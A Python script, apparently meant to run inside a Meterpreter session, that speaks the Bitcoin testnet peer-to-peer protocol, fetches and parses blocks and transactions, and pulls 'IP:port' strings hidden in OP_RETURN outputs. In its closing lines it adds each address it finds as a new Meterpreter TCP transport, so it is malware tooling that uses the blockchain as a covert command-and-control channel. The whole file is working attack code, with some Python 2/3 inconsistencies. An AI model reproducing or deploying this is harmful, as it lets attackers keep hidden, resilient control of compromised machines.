import socket
import time
import random
import struct
import hashlib
import binascii
import re

# import only works inside of meterpreter
import meterpreter.transport

class BTC_OP_Scanner:
    def __init__(self):
       self.inboundAddress = None
       self.inboundPort = None
       self.outboundAddress = None
       self.outboundPort = None
       self.socket = None
       self.magicValue = None
       self.bufferSize = None
       self.version = None
       self.potential_transports = []

    def return_test_instance(self, inboundAddress, outboundAddress, version):
        self.magicValue =  0x0709110B
        self.inboundAddress = inboundAddress
        self.inboundPort = 18333
        self.outboundAddress = outboundAddress
        self.outboundPort = 18333
        self.bufferSize = 100000
        self.version = version
        self.client = "/Satoshi:0.7.2/"
        self.establishSocketConnection()
        return self

    def create_network_address(self, ip_address, port):
        network_address = struct.pack(">8s16sH", b"\x01",
            str(bytearray.fromhex("00000000000000000000ffff")
            + socket.inet_aton(ip_address)), port)

        return(network_address)

    def create_message(self, command, payload):
        checksum = hashlib.sha256(hashlib.sha256(payload).digest()).digest()[0:4]

        return(struct.pack("L12sL4s", self.magicValue,
            command.encode(), len(payload),
            checksum) + payload)

    def create_sub_version(self):
        return b"\x0F" + self.client.encode()

    # Create the "version" request payload
    def create_payload_version(self):
        services = 1
        timestamp = int(time.time())
        addr_local = self.create_network_address(self.inboundAddress, self.inboundPort)
        addr_peer = self.create_network_address(self.outboundAddress, self.outboundPort)
        nonce = random.getrandbits(64)
        user_agent = '00'
        start_height = 0
        relay_bool = False
        payload = struct.pack("<LQQ26s26sQ0s16sL?",
            self.version, services, timestamp, addr_peer,
            addr_local, nonce, user_agent, self.create_sub_version(), start_height, relay_bool)

        return(payload)

    def create_message_verack(self):
        return bytearray.fromhex("0b110907" + "76657261636b000000000000" + "00000000" + "5df6e0e2")

    def create_payload_getdata(self, tx_id):
        payload = bytearray()
        count = 1
        data_type = 2
        hash = bytearray.fromhex(tx_id)
        # hash_2 = bytearray.fromhex(tx_id_2)
        payload.append(count)
        payload.append(data_type & 0xFF)
        payload.append((data_type & 0xFF00) >> 8)
        payload.append((data_type & 0xFF0000) >> 16)
        payload.append((data_type & 0xFF000000) >> 24)
        payload.extend(hash)
        # payload.append(data_type & 0xFF)
        # payload.append((data_type & 0xFF00) >> 8)
        # payload.append((data_type & 0xFF0000) >> 16)
        # payload.append((data_type & 0xFF000000) >> 24)
        # payload.extend(hash_2)
        return(payload)

    def create_payload_getblocks(self, block_hash, stop_hash):
        block_version = 1
        count = 1
        locator = str(bytearray.fromhex(block_hash))
        stop = str(bytearray.fromhex(stop_hash))
        payload = struct.pack("<Lb32s32s", block_version , count, locator, stop)
        return(payload)

    # def create_payload_filterload(self, hashfunc, )

    def establishSocketConnection(self):
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        print(self.outboundAddress, self.outboundPort)
        self.socket.connect((self.outboundAddress, self.outboundPort))

    def validate_script_sig(self, script_sig):
        if(script_sig[:4] == '6a0e' and re.match(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,4}$",script_sig[4:].decode('hex'))):
            self.potential_transports.append(script_sig[4:].decode("hex"))
        else:
            return

    def parse_tx_messages(self, total_tx, transaction_messages, tx_count = 1):
        if(tx_count < 4):
            print(binascii.hexlify(transaction_messages[:4]))
            transaction_version = struct.unpack("I", transaction_messages[:4])[0]
            input_count =  struct.unpack("B",  transaction_messages[4:5])[0]
            index_bit = 5
            print("[ TX_COUNT " + str(tx_count) + " ]")
            print("Transaction version: ", transaction_version)
            print("Input count: ", input_count)
            # Parses Input Transactions
            for i in range(input_count):
                hash_val = binascii.hexlify(transaction_messages[index_bit:index_bit+32])
                index_val = struct.unpack("I", transaction_messages[index_bit+32:index_bit+36])[0]
                index_bit = index_bit+36
                script_length = struct.unpack("B", transaction_messages[index_bit:index_bit+1])[0]
                script_sig = binascii.hexlify(transaction_messages[index_bit+1: index_bit+script_length+1])
                index_bit = index_bit+script_length+1
                sequence_val = binascii.hexlify(transaction_messages[index_bit:index_bit+4])
                index_bit = index_bit+4


                print("Transaction Input: ")
                print("-- Previous output --")
                print("     Hash: ", hash_val)
                print("     Index: ", index_val)
                print("Script length: ", script_length)
                print("Signature script: ", script_sig)
                print("Sequence: ", sequence_val)

            output_count = struct.unpack("B", transaction_messages[index_bit:index_bit+1])[0]
            print("output_count: ", output_count)
            for i in range(output_count):
                tx_value = struct.unpack("Q", transaction_messages[index_bit+1:index_bit+9])[0]
                index_bit = index_bit+9
                script_length = struct.unpack("B", transaction_messages[index_bit:index_bit+1])[0]
                output_script_sig = binascii.hexlify(transaction_messages[index_bit+1: index_bit+script_length+1])
                index_bit = index_bit+script_length

                print("Transaction Output: ")
                print("    Value: ", tx_value)
                print("    Script length: ", script_length)
                print("    Signature script: ", output_script_sig)

                self.validate_script_sig(output_script_sig);

            block_id = struct.unpack("I", transaction_messages[index_bit+1:index_bit+5])[0]

            print("Block lock time orblock ID: ", block_id)

            index_bit = index_bit+5
            tx_count += 1
            self.parse_tx_messages(total_tx, transaction_messages[index_bit:], tx_count)
        else:
            print("------ TRANSACTION PARSING COMPLETED -----")
            return




    def parse_block_msg(self, block_msg):
        block_version = struct.unpack("I", block_msg[:4])[0]
        prev_block = binascii.hexlify(block_msg[4:36])
        merkle_root = binascii.hexlify(block_msg[36:68])
        block_time = binascii.hexlify(block_msg[68:72])
        bits = binascii.hexlify(block_msg[72:76])
        nonce = binascii.hexlify(block_msg[76:80])
        num_transactions = struct.unpack("B", block_msg[80:81])[0]
        transactions = block_msg[81:]

        print("************")
        print("Block Version: ", block_version)
        print("Previous Block: ", prev_block);
        print("Merkle root: ", merkle_root)
        print("Block timestamp: ", block_time)
        print("Bits:  ", bits)
        print("Nonce:  ", nonce)
        print("Number of transactions:  ", num_transactions)
        print("************")

        self.parse_tx_messages(num_transactions, transactions)

    def parse_data(self, response_data):
        magic_value = binascii.hexlify(response_data[:4])
        resp_command = response_data[4:16].rstrip('\x00')
        # print()
        # print(len(binascii.hexlify(response_data[16:20])))
        # print("RESPLEN:", struct.unpack("<L", binascii.hexlify(response_data[16:20])))
        resp_length = struct.unpack("H", response_data[16:18])[0]
        check_sum = binascii.hexlify(response_data[20:24])

        payload = response_data[24:resp_length+24];

        extra_data = response_data[resp_length+24:];

        print("----------------")
        print("Magic Value: ", magic_value)
        print("Command Name: ", resp_command);
        print("Payload Length: ", resp_length)
        print("Checksum: ", check_sum)
        print("Payload: ", payload)
        print("----------------")

        if(len(extra_data) > 0):
            self.parse_data(extra_data)

        if(resp_command == "sendheaders"):
            data = self.socket.recv(self.bufferSize);
            self.parse_data(data);

        if(resp_command == "block"):
            # data = self.socket.recv(self.bufferSize);
            print("$$ BLOCK LOCATED $$")
            print("Processing Inventory")
            self.parse_block_msg(payload)

        return


    # Initial Handshake Sequence: 1
    def send_version(self):
        version_payload = self.create_payload_version()
        version_message = self.create_message("version", version_payload)

        self.socket.send(version_message)
        time.sleep(4)
        response_data = self.socket.recv(self.bufferSize)
        self.parse_data(response_data)

    # Initial Handshake Sequence: 2
    def send_verack(self):
        verack_message = self.create_message_verack()

        self.socket.send(verack_message)
        response_data = self.socket.recv(self.bufferSize)
        self.parse_data(response_data)

    # Attempts to send getdata request to peer, recieves inv object if data matches
    # Note: This only gets 0conf data, or data held in mempool
    def send_getdata(self, tx_id):
        getdata_payload = self.create_payload_getdata(tx_id)
        getdata_message = self.create_message('getdata', getdata_payload)

        self.socket.send(getdata_message)
        time.sleep(5)
        response_data = self.socket.recv(self.bufferSize)
        self.parse_data(response_data)

    # Attempts to get block data from block_hash, to hash_stop
    def send_getblocks(self, block_hash, hash_stop):
        getblocks_payload = self.create_payload_getblocks(block_hash, hash_stop)
        getblocks_message = self.create_message('getblocks', getblocks_payload)

        self.socket.send(getblocks_message)
        response_data = self.socket.recv(self.bufferSize)
        self.parse_data(response_data)

    def send_getaddr(self):
        getaddr_message = self.create_message('getaddr', '')

        self.socket.send(getaddr_message)
        response_data = self.socket.recv(self.bufferSize)
        self.parse_data(response_data)

    def send_filterload(self, hashfunc):
        return 'n'
    # parses initial handshake with peer
    def launch(self):
        self.send_version()
        self.send_verack()



# tx_id = "a0ecebde2b7a465604a799b10527003bab9bd3979ed942c0b8ae93f21a4f002e"
tmp_block_stop = "000000000000592589e55cda6e8a093998e8356ea770d4aaeb7c0f5439b147d7"
tmp_block_hash = "41f0a5df5c7cd31cd1c8a587d894a2ec9df24ee218fab7365501000000000000"

block_hash = "".join(list(reversed([tmp_block_hash[i:i+2] for i in range(0, len(tmp_block_hash), 2)])))
block_stop = "".join(list(reversed([tmp_block_stop[i:i+2] for i in range(0, len(tmp_block_stop), 2)])))

btc_op_scanner = BTC_OP_Scanner().return_test_instance("10.0.0.7", "10.0.0.7", 70015)
btc_op_scanner.launch()
# btc_op_scanner.send_getaddr()
# testnetMalware.send_getdata("b694ee86425764f668b2bde4e77834b4dcc9800fda712e09e0efb8a0e8c67cb8");
# testnetMalware.send_getblocks(block_hash, block_stop)
time.sleep(3)
btc_op_scanner.send_getdata(block_stop)
# btc_op_scanner.validate_script_sig('6a0e3132372e302e302e313a38313831')
print("COMPLETED SCAN:")

if(len(btc_op_scanner.potential_transports) > 0):
    print("POTENTIAL TRANSPORTS: ")
    print(btc_op_scanner.potential_transports)
    for i in btc_op_scanner.potential_transports:
        print("tcp://" + i)
        meterpreter.transport.add("tcp://" + i)
